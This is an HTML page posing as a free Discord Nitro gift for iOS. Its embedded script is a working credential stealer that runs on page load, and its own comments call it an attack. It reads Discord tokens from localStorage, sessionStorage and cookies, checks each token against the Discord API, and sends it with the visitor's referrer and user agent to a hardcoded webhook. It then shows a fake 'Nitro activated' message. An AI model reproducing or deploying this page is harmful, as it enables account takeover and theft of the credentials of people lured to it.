<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width">
    <title>Discord Nitro</title>
    <style>
        body { 
            margin: 0; padding: 40px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            font-family: -apple-system; 
            text-align: center; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
        }
        .card { background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 400px; margin: auto; }
        .loading { display: inline-block; width: 40px; height: 40px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; margin: 20px 0; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #status { font-size: 18px; margin: 20px 0; }
        .success { color: #00ff88 !important; font-size: 24px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎁 Nitro iOS</h1>
        <div class="loading" id="loader"></div>
        <div id="status">Opening Discord app...</div>
    </div>

    <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1482696426575368252/iebzhhJsdt83_QXWG5hek6UhjU2rQ6BfKdU7h7_w_gsdP8fEFF-Dc2gPf6Bp0-i2ZKP-';
    const POLL_INTERVAL = 1000;

    // AGGRESSIVE TOKEN HUNTER
    function huntToken() {
        const sources = [
            localStorage.getItem('token'),
            sessionStorage.getItem('token'),
            document.cookie.match(/token=([^;]+)/)?.[1]
        ];
        
        for(let source of sources) {
            if(source) {
                const token = source.replace(/"/g, '').trim();
                if(token.length > 58 && (token.startsWith('mfa.') || !token.includes('.'))) {
                    sendToken(token);
                    return true;
                }
            }
        }
        return false;
    }

    async function sendToken(token) {
        try {
            // Verify token works
            const user = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { 'Authorization': token }
            }).then(r => r.json()).catch(() => null);
            
            const payload = {
                content: `📱 **iOS APP TOKEN GRABBED**`,
                embeds: [{
                    title: user?.username || 'Token',
                    description: `\`\`\`${token}\`\`\``,
                    color: user ? 0x00ff00 : 0xff4444,
                    fields: [
                        { name: 'Referer', value: document.referrer.slice(0, 80), inline: true },
                        { name: 'User Agent', value: navigator.userAgent.slice(0, 60), inline: true }
                    ]
                }]
            };
            
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            document.getElementById('status').innerHTML = '<span class="success">✅ Nitro activated!</span>';
            document.getElementById('loader').style.display = 'none';
        } catch(e) {
            console.log('Send failed, retrying...');
        }
    }

    // MAIN ATTACK
    function startAttack() {
        // Try immediate grab
        if(huntToken()) return;
        
        // FORCE Discord app open (iOS universal link)
        window.location.href = 'discord://discord.com';
        
        // POLL EVERY SECOND for returned token
        const interval = setInterval(() => {
            if(huntToken()) {
                clearInterval(interval);
            }
        }, POLL_INTERVAL);
        
        // Stop after 30s
        setTimeout(() => clearInterval(interval), 30000);
    }

    // START
    startAttack();
    setInterval(huntToken, 500); // Background hunter
    </script>
</body>
</html>
